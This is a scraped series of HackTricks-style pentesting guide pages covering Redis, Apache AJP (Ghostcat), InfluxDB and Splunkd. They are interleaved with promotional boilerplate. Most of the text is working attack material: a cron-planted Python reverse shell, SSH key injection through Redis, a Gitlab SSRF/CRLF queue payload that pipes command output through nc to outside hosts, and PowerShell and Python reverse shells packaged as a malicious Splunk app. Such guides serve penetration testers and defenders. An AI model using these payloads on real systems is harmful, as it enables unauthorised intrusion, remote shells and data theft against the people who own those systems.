user\n(usually\n/var/lib/redis\nor\n/home/redis/.ssh\n), and knowing this you know where you can write the\nauthenticated_users\nfile to access via ssh\nwith the user redis\n. If you know the home of other valid user where you have writable permissions you can also abuse it:\n1.\nGenerate a ssh public-private key pair on your pc:\nssh-keygen -t rsa\n2.\nWrite the public key to a file :\n(echo -e \"\\n\\n\"; cat ~/id_rsa.pub; echo -e \"\\n\\n\") > spaced_key.txt\n3.\nImport the file into redis :\ncat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key\n4.\nSave the public key to the\nauthorized_keys\nfile on redis server:\nroot@Urahara:~# redis-cli -h 10.85.0.52\n10.85.0.52:6379> config set dir /var/lib/redis/.ssh\nOK\n10.85.0.52:6379> config set dbfilename \"authorized_keys\"\nOK\n10.85.0.52:6379> save\nOK\n5.\nFinally, you can\nssh\nto the\nredis server\nwith private key :\nssh -i id_rsa\n[email¬†protected]\nThis technique is automated here:\nhttps://github.com/Avinash-acid/Redis-Server-Exploit\n‚Äã\nCrontab\nroot@Urahara:~# echo -e \"\\n\\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.85.0.53\\\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\\n\\n\"|redis-cli -h 10.85.0.52 -x set 1\nOK\nroot@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/\nOK\nroot@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root\nOK\nroot@Urahara:~# redis-cli -h 10.85.0.52 save\nOK\nThe last exampleis for Ubuntu, for\nCentos\n, the above command should be:\nredis-cli -h 10.85.0.52 config set dir /var/spool/cron/\nThis method can also be used to earn bitcoin Ôºö\nyam\n‚Äã\nLoad Redis Module\n1.\nFollowing the instructions from\nhttps://github.com/n0b0dyCN/RedisModules-ExecuteCommand\nyou can\ncompile a redis module to execute arbitrary commands\n.\n2.\nThen you need some way to\nupload the compiled\nmodule\n3.\nLoad the uploaded module\nat runtime with\nMODULE LOAD /path/to/mymodule.so\n4.\nList loaded modules\nto check it was correctly loaded:\nMODULE LIST\n5.\nExecute\ncommands\n:\n127.0.0.1:6379> system.exec \"id\"\n\"uid=0(root) gid=0(root) groups=0(root)\\n\"\n127.0.0.1:6379> system.exec \"whoami\"\n\"root\\n\"\n127.0.0.1:6379> system.rev 127.0.0.1 9999\n6.\nUnload the module whenever you want:\nMODULE UNLOAD mymodule\nLUA sandbox bypass\n‚Äã\nHere\nyou can see that Redis uses the command\nEVAL\nto execute\nLua code sandboxed\n. In the linked post you can see\nhow to abuse it\nusing the\ndofile\nfunction, but\napparently\nthis isn't no longer possible. Anyway, if you can\nbypass the Lua\nsandbox you could\nexecute arbitrary\ncommands on the system. Also, from the same post you can see some\noptions to cause DoS\n.\nSome\nCVEs to escape from LUA\n:\n‚Äã\nhttps://github.com/aodsec/CVE-2022-0543\n‚Äã\nMaster-Slave Module\n‚ÄãThe master redis all operations are automatically synchronized to the slave redis, which means that we can regard the vulnerability redis as a slave redis, connected to the master redis which our own controlled, then we can enter the command to our own redis.\nmaster redis : 10.85.0.51 (Hacker's Server)\nslave  redis : 10.85.0.52 (Target Vulnerability Server)\nA master-slave connection will be established from the slave redis and the master redis:\nredis-cli -h 10.85.0.52 -p 6379\nslaveof 10.85.0.51 6379\nThen you can login to the master redis to control the slave redis:\nredis-cli -h 10.85.0.51 -p 6379\nset mykey hello\nset mykey2 helloworld\nSSRF talking to Redis\nIf you can send\nclear text\nrequest\nto Redis\n, you can\ncommunicate with it\nas Redis will read line by line the request and just respond with errors to the lines it doesn't understand:\n-ERR wrong number of arguments for 'get' command\n-ERR unknown command 'Host:'\n-ERR unknown command 'Accept:'\n-ERR unknown command 'Accept-Encoding:'\n-ERR unknown command 'Via:'\n-ERR unknown command 'Cache-Control:'\n-ERR unknown command 'Connection:'\nTherefore, if you find a\nSSRF vuln\nin a website and you can\ncontrol\nsome\nheaders\n(maybe with a CRLF vuln) or\nPOST parameters\n, you will be able to send arbitrary commands to Redis.\nExample: Gitlab SSRF + CRLF to Shell\nIn\nGitlab11.4.7\nwere discovered a\nSSRF\nvulnerability and a\nCRLF\n. The\nSSRF\nvulnerability was in the\nimport project from URL functionality\nwhen creating a new project and allowed to access arbitrary IPs in the form [0:0:0:0:0:ffff:127.0.0.1] (this will access 127.0.0.1), and the\nCRLF\nvuln was exploited just\nadding %0D%0A\ncharacters to the\nURL\n.\nTherefore, it was possible to\nabuse these vulnerabilities to talk to the Redis instance\nthat\nmanages queues\nfrom\ngitlab\nand abuse those queues to\nobtain code execution\n. The Redis queue abuse payload is:\nmulti\nsadd resque:gitlab:queues system_hook_push\nlpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|whoami | nc 192.241.233.143 80\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"\nexec\nAnd the\nURL encode\nrequest\nabusing SSRF\nand\nCRLF\nto execute a\nwhoami\nand send back the output via\nnc\nis:\ngit://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git\nFor some reason (as for the author of\nhttps://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/\nwhere this info was took from) the exploitation worked with the\ngit\nscheme and not with the\nhttp\nscheme.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n6000 - Pentesting X11\nNext\n- Network Services Pentesting\n8009 - Pentesting Apache JServ Protocol (AJP)\nLast modified\n4mo ago"
    },
    {
        "title": "8009 - Pentesting Apache JServ Protocol (AJP)",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp",
        "text": "8009 - Pentesting Apache JServ Protocol (AJP)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nBasic Information\nFrom:\nhttps://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/\n‚Äã\nAJP is a wire protocol. It an optimized version of the HTTP protocol to allow a standalone web server such as\nApache\nto talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible, but proxy the request to Tomcat for Tomcat related content.\nAlso interesting:\nThe ajp13 protocol is packet-oriented. A binary format was presumably chosen over the more readable plain text for reasons of performance. The web server communicates with the servlet container over TCP connections. To cut down on the expensive process of socket creation, the web server will attempt to maintain persistent TCP connections to the servlet container, and to reuse a connection for multiple request/response cycles\nDefault port:\n8009\nPORT     STATE SERVICE\n8009/tcp open  ajp13\nCVE-2020-1938\n'Ghostcat'\n‚Äã\nIf the AJP port is exposed, Tomcat might be susceptible to the Ghostcat vulnerability. Here is an\nexploit\nthat works with this issue.\nGhostcat is a LFI vulnerability, but somewhat restricted: only files from a certain path can be pulled. Still, this can include files like\nWEB-INF/web.xml\nwhich can leak important information like credentials for the Tomcat interface, depending on the server setup.\nPatched versions at or above 9.0.31, 8.5.51, and 7.0.100 have fixed this issue.\nEnumeration\nAutomatic\nnmap\n-sV\n--script\najp-auth,ajp-headers,ajp-methods,ajp-request\n-n\n-p\n8009\n<\nIP\n>\n‚Äã\nBrute force\n‚Äã\nAJP Proxy\nApache AJP Proxy\nIt‚Äôs not often that you encounter port 8009 open and no other web port open. In which case it would be nice to use existing tools like metasploit to still pwn it right? As stated in one of the quotes you can (ab)use Apache to proxy the requests to Tomcat port 8009. In the references you will find a nice guide on how to do that (read it first), what follows is just an overview of the commands I used on my own machine. I omitted some of the original instruction since they didn‚Äôt seem to be necessary.\nsudo\napt-get\ninstall\nlibapache2-mod-jk\nsudo\nvim\n/etc/apache2/apache2.conf\n# append the following line to the config\nInclude ajp.conf\nsudo\nvim\n/etc/apache2/ajp.conf\n# create the following file, change HOST to the target address\nProxyRequests Off\n<\nProxy *\n>\nOrder deny,allow\nDeny from all\nAllow from localhost\n<\n/Proxy\n>\nProxyPass       / ajp://HOST:8009/\nProxyPassReverse    / ajp://HOST:8009/\nsudo\na2enmod proxy_http\nsudo\na2enmod proxy_ajp\nsudo\nsystemctl restart apache2\nA nice side effect of using this setup is that you might thwart IDS/IPS systems in place since the AJP protocol is somewhat binary, but I haven‚Äôt verified this. Now you can just point your regular metasploit tomcat exploit to 127.0.0.1:80 and take over that system. Here is the metasploit output also:\nmsf  exploit\n(\ntomcat_mgr_deploy\n)\n>\nshow options\n‚Äã\nModule options\n(\nexploit/multi/http/tomcat_mgr_deploy\n)\n:\n‚Äã\nName      Current Setting  Required  Description\n----      ---------------  --------  -----------\nPASSWORD  tomcat           no        The password\nfor\nthe specified username\nPATH\n/manager\nyes\nThe URI path of the manager app\n(\n/deploy and /undeploy will be used\n)\nProxies                    no        Use a proxy chain\nRHOST     localhost\nyes\nThe target address\nRPORT\n80\nyes\nThe target port\nUSERNAME  tomcat           no        The username to authenticate as\nVHOST                      no        HTTP server virtual\nhost\nNginx Reverse Proxy & AJP\n‚Äã\nCheckout the Dockerized version\n‚Äã\nWhen we come across an open AJP proxy port (8009 TCP), we can use Nginx with the\najp_module\nto access the \"hidden\" Tomcat Manager. This can be done by compiling the Nginx source code and adding the required module, as follows:\nDownload the Nginx source code\nDownload the required module\nCompile Nginx source code with the\najp_module\n.\nCreate a configuration file pointing to the AJP Port\n# Download Nginx code\nwget\nhttps://nginx.org/download/nginx-1.21.3.tar.gz\ntar\n-xzvf\nnginx-1.21.3.tar.gz\n‚Äã\n# Compile Nginx source code with the ajp module\ngit\nclone https://github.com/dvershinin/nginx_ajp_module.git\ncd\nnginx-1.21.3\nsudo\napt\ninstall\nlibpcre3-dev\n./configure --add-module\n=\n`\npwd\n`\n/\n..\n/nginx_ajp_module\n--prefix\n=\n/etc/nginx --sbin-path\n=\n/usr/sbin/nginx --modules-path\n=\n/usr/lib/nginx/modules\nmake\nsudo\nmake\ninstall\nnginx\n-V\nComment out the entire\nserver\nblock and append the following lines inside the\nhttp\nblock in\n/etc/nginx/conf/nginx.conf\n.\nupstream tomcats {\nserver <TARGET_SERVER>:8009;\nkeepalive 10;\n}\nserver {\nlisten 80;\nlocation / {\najp_keep_conn on;\najp_pass tomcats;\n}\n}\nStart Nginx and check if everything is working correctly by issuing a cURL request to your local host.\nsudo nginx\ncurl http://127.0.0.1:80\n‚Äã\n<!\nDOCTYPE\nhtml\n>\n<\nhtml\nlang\n=\n\"\nen\n\"\n>\n<\nhead\n>\n<\nmeta\ncharset\n=\n\"\nUTF-8\n\"\n/>\n<\ntitle\n>\nApache Tomcat/X.X.XX\n</\ntitle\n>\n<\nlink\nhref\n=\n\"\nfavicon.ico\n\"\nrel\n=\n\"\nicon\n\"\ntype\n=\n\"\nimage/x-icon\n\"\n/>\n<\nlink\nhref\n=\n\"\nfavicon.ico\n\"\nrel\n=\n\"\nshortcut icon\n\"\ntype\n=\n\"\nimage/x-icon\n\"\n/>\n<\nlink\nhref\n=\n\"\ntomcat.css\n\"\nrel\n=\n\"\nstylesheet\n\"\ntype\n=\n\"\ntext/css\n\"\n/>\n</\nheadas\n<body\n>\n<\ndiv\nid\n=\n\"\nwrapper\n\"\n>\n<\ndiv\nid\n=\n\"\nnavigation\n\"\nclass\n=\n\"\ncurved container\n\"\n>\n<\nspan\nid\n=\n\"\nnav-home\n\"\n>\n<\na\nhref\n=\n\"\nhttps://tomcat.apache.org/\n\"\n>\nHome\n</\na\n>\n</\nspan\n>\n<\nspan\nid\n=\n\"\nnav-hosts\n\"\n>\n<\na\nhref\n=\n\"\n/docs/\n\"\n>\nDocumentation\n</\na\n>\n</\nspan\n>\n<\nspan\nid\n=\n\"\nnav-config\n\"\n>\n<\na\nhref\n=\n\"\n/docs/config/\n\"\n>\nConfiguration\n</\na\n>\n</\nspan\n>\n<\nspan\nid\n=\n\"\nnav-examples\n\"\n>\n<\na\nhref\n=\n\"\n/examples/\n\"\n>\nExamples\n</\na\n>\n</\nspan\n>\n<\nspan\nid\n=\n\"\nnav-wiki\n\"\n>\n<\na\nhref\n=\n\"\nhttps://wiki.apache.org/tomcat/FrontPage\n\"\n>\nWiki\n</\na\n>\n</\nspan\n>\n<\nspan\nid\n=\n\"\nnav-lists\n\"\n>\n<\na\nhref\n=\n\"\nhttps://tomcat.apache.org/lists.html\n\"\n>\nMailing Lists\n</\na\n>\n</\nspan\n>\n<\nspan\nid\n=\n\"\nnav-help\n\"\n>\n<\na\nhref\n=\n\"\nhttps://tomcat.apache.org/findhelp.html\n\"\n>\nFind Help\n</\na\n>\n</\nspan\n>\n<\nbr\nclass\n=\n\"\nseparator\n\"\n/>\n</\ndiv\n>\n<\ndiv\nid\n=\n\"\nasf-box\n\"\n>\n<\nh1\n>\nApache Tomcat/X.X.XX\n</\nh1\n>\n</\ndiv\n>\n<\ndiv\nid\n=\n\"\nupper\n\"\nclass\n=\n\"\ncurved container\n\"\n>\n<\ndiv\nid\n=\n\"\ncongrats\n\"\nclass\n=\n\"\ncurved container\n\"\n>\n<\nh2\n>\nIf you're seeing this, you've successfully installed Tomcat. Congratulations!\n</\nh2\n>\n<\nSNIP\n>\nDockerized-version\ngit\nclone https://github.com/ScribblerCoder/nginx-ajp-docker\ncd\nnginx-ajp-docker\nReplace\nTARGET-IP\nin\nnginx.conf\nwitg AJP IP then build and run\ndocker\nbuild\n.\n-t\nnginx-ajp-proxy\ndocker\nrun\n-it\n--rm\n-p\n80\n:80 nginx-ajp-proxy\nReferences\n‚Äã\nhttps://academy.hackthebox.com/module/145/section/1295\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n6379 - Pentesting Redis\nNext\n- Network Services Pentesting\n8086 - Pentesting InfluxDB\nLast modified\n2mo ago"
    },
    {
        "title": "8086 - Pentesting InfluxDB",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/8086-pentesting-influxdb",
        "text": "8086 - Pentesting InfluxDB\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nInfluxDB\nis an open-source\ntime series database\n(TSDB) developed by the company InfluxData.\nA\ntime series database (TSDB)\nis a software system that is optimized for storing and\nserving time series\nthrough associated pairs of time(s) and value(s).\nTime series datasets are\nrelatively large and uniform compared to other datasets\n‚Äïusually being composed of a timestamp and associated data. Time series datasets can also have fewer relationships between data entries in different tables and don't require indefinite storage of entries. The unique properties of time series datasets mean that time series databases can provide\nsignificant improvements in storage space and performance over general purpose databases\n. For instance, due to the uniformity of time series data,\nspecialized compression algorithms\ncan provide improvements over regular compression algorithms designed to work on less uniform data. Time series databases can also be\nconfigured to regularly delete old data\n, unlike regular databases which are designed to store data indefinitely. Special database indices can also provide boosts in query performance. (From\nhere\n).\nDefault port\n: 8086\nPORT     STATE SERVICE VERSION\n8086/tcp open  http    InfluxDB http admin 1.7.5\nEnumeration\nFrom a pentester point of view this another database that could be storing sensitive information, so it's interesting to know how to dump all the info.\nAuthentication\nInfluxDB might require authentication or not\n# Try unauthenticated\ninflux\n-host\n'host name'\n-port\n'port #'\n>\nuse _internal\nIf you\nget an error like\nthis one:\nERR: unable to parse authentication credentials\nit means that it's\nexpecting some credentials\n.\ninflux ‚Äìusername influx ‚Äìpassword influx_pass\nThere was a vulnerability influxdb that allowed to bypass the authentication:\nCVE-2019-20933\n‚Äã\nManual Enumeration\nThe information of this example was taken from\nhere\n.\nShow databases\nThe found databases are\ntelegraf\nand\n_internal\n(you will find this one everywhere)\n>\nshow databases\nname: databases\nname\n----\ntelegraf\n_internal\nShow tables/measurements\nAs the\nInfluxDB documentation\nexplains, SQL\nmeasurements\ncan be thought of as SQL tables. As the\nmeasurement\nnames above suggest, each one contains information which pertains to a specific entity\n>\nshow measurements\nname: measurements\nname\n----\ncpu\ndisk\ndiskio\nkernel\nmem\nprocesses\nswap\nsystem\nShow columns/field keys\nThe field keys are like the\ncolumns\nof the database\n>\nshow field keys\nname: cpu\nfieldKey         fieldType\n--------         ---------\nusage_guest      float\nusage_guest_nice float\nusage_idle       float\nusage_iowait     float\n‚Äã\nname: disk\nfieldKey     fieldType\n--------     ---------\nfree\ninteger\ninodes_free  integer\ninodes_total integer\ninodes_used  integer\n‚Äã\n[\n..\n.\nmore\nkeys\n..\n.\n]\nDump Table\nAnd finally you can\ndump the table\ndoing something like\nselect\n* from cpu\nname: cpu\ntime\ncpu\nhost\nusage_guest usage_guest_nice usage_idle        usage_iowait        usage_irq usage_nice usage_softirq        usage_steal usage_system        usage_user\n----                ---       ----   ----------- ---------------- ----------        ------------        --------- ---------- -------------        ----------- ------------        ----------\n1497018760000000000\ncpu-total ubuntu\n0\n0\n99.297893681046\n0\n0\n0\n0\n0\n0.35105315947842414\n0.35105315947842414\n1497018760000000000\ncpu1      ubuntu\n0\n0\n99.69909729188728\n0\n0\n0\n0\n0\n0.20060180541622202\n0.10030090270811101\nIn some testing with the authentication bypass it was noted that the name of the table needed to be between double quotes like:\nselect * from \"cpu\"\nAutomated Authentication\nmsf6\n>\nuse auxiliary/scanner/http/influxdb_enum\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nNetwork Services Pentesting -\nPrevious\n8009 - Pentesting Apache JServ Protocol (AJP)\nNext\n- Network Services Pentesting\n8089 - Pentesting Splunkd\nLast modified\n2mo ago"
    },
    {
        "title": "8089 - Pentesting Splunkd",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/8089-splunkd",
        "text": "8089 - Pentesting Splunkd\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nSplunk\nis a\nlog analytics tool\nused to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for\nsecurity monitoring and business analytics\n. Splunk deployments are often used to house\nsensitive data\nand could provide a wealth of information for an attacker if compromised.\nDefault port:\n8089\nPORT     STATE SERVICE VERSION\n8089/tcp open  http    Splunkd httpd\nThe\nSplunk web server runs by default on port 8000\n.\nEnumeration\nFree Version\nThe Splunk Enterprise trial converts to a\nfree version after 60 days\n, which\ndoesn‚Äôt require authentication\n. It is not uncommon for system administrators to install a trial of Splunk to test it out, which is\nsubsequently forgotten about\n. This will automatically convert to the free version that does not have any form of authentication, introducing a security hole in the environment. Some organizations may opt for the free version due to budget constraints, not fully understanding the implications of having no user/role management.\nDefault Credentials\nOn older versions of Splunk, the default credentials are\nadmin:changeme\n, which are conveniently displayed on the login page.\nHowever,\nthe latest version of Splunk\nsets\ncredentials\nduring the installation process\n. If the default credentials do not work, it is worth checking for common weak passwords such as\nadmin\n,\nWelcome\n,\nWelcome1\n,\nPassword123\n, etc.\nObtain Information\nOnce logged in to Splunk, we can\nbrowse data,\nrun\nreports\n, create\ndashboards\n,\ninstall applications\nfrom the Splunkbase library, and install custom applications.\nYou can also run code: Splunk has multiple ways of\nrunning code\n, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input.\nMoreover, as Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts.\nShodan\nSplunk build\nRCE\nCreate Custom Application\nA custom application can run\nPython, Batch, Bash, or PowerShell scripts\n.\nNote that\nSplunk comes with Python installed\n, so even in\nWindows\nsystems you will be able to run python code.\nYou can use\nthis\nSplunk package to assist us. The\nbin\ndirectory in this repo has examples for\nPython\nand\nPowerShell\n. Let's walk through this step-by-step.\nTo achieve this, we first need to create a custom Splunk application using the following directory structure:\ntree splunk_shell/\n‚Äã\nsplunk_shell/\n‚îú‚îÄ‚îÄ bin\n‚îî‚îÄ‚îÄ default\nThe\nbin\ndirectory will contain any\nscripts that we intend to run\n(in this case, a\nPowerShell\nreverse shell), and the default directory will have our\ninputs.conf\nfile. Our reverse shell will be a\nPowerShell one-liner:\n$client\n=\nNew-Object\nSystem\n.\nNet\n.\nSockets\n.\nTCPClient\n(\n'10.10.10.10'\n,\n443\n);\n$stream\n=\n$client\n.\nGetStream\n();\n[byte[]]\n$bytes\n= 0\n..\n65535\n|\n%\n{\n0\n};\nwhile\n((\n$i\n=\n$stream\n.\nRead\n(\n$bytes\n,\n0\n,\n$bytes\n.\nLength\n))\n-ne\n0\n){;\n$data\n=\n(\nNew-Object\n-\nTypeName System\n.\nText\n.\nASCIIEncoding\n).\nGetString\n(\n$bytes\n,\n0\n,\n$i\n);\n$sendback\n=\n(\niex\n$data\n2>&1\n|\nOut-String\n);\n$sendback2\n=\n$sendback\n+\n'PS '\n+\n(\npwd\n).\nPath\n+\n'> '\n;\n$sendbyte\n=\n(\n[text.encoding]\n::ASCII\n).\nGetBytes\n(\n$sendback2\n);\n$stream\n.\nWrite\n(\n$sendbyte\n,\n0\n,\n$sendbyte\n.\nLength\n);\n$stream\n.\nFlush\n()};\n$client\n.\nClose\n(\nThe\ninputs.conf\nfile tells Splunk\nwhich script to run\nand any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.\ncat inputs.conf\n‚Äã\n[script://./bin/rev.py]\ndisabled = 0\ninterval = 10\nsourcetype = shell\n‚Äã\n[script://.\\bin\\run.bat]\ndisabled = 0\nsourcetype = shell\ninterval = 10\nWe need the\n.bat\nfile, which will run when the application is deployed and execute the PowerShell one-liner.\nThe next step is to choose\nInstall app from file\nand upload the application.\nBefore uploading the malicious custom app, let's start a listener using Netcat or\nsocat\n.\nsudo nc -lnvp 443\n‚Äã\nlistening on [any] 443 ...\nOn the\nUpload app\npage, click on browse, choose the tarball we created earlier and click\nUpload\n. **** As\nsoon as we upload the application\n, a\nreverse shell is received\nas the status of the application will automatically be switched to\nEnabled\n.\nLinux\nIf we were dealing with a\nLinux host\n, we would need to\nedit the\nrev.py\nPython script\nbefore creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.\nimport\nsys\n,\nsocket\n,\nos\n,\npty\n‚Äã\nip\n=\n\"10.10.14.15\"\nport\n=\n\"443\"\ns\n=\nsocket\n.\nsocket\n()\ns\n.\nconnect\n((\nip\n,\nint\n(\nport\n)))\n[\nos\n.\ndup2\n(\ns\n.\nfileno\n(),\nfd\n)\nfor\nfd\nin\n(\n0\n,\n1\n,\n2\n)]\npty\n.\nspawn\n(\n'/bin/bash'\n)\nRCE & Privilege Escalation\nIn the following page you can find an explanation how this service can be abused to escalate privileges and obtain persistence:\nSplunk LPE and Persistence\nReferences\n‚Äã\nhttps://academy.hackthebox.com/module/113/section/1213\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud 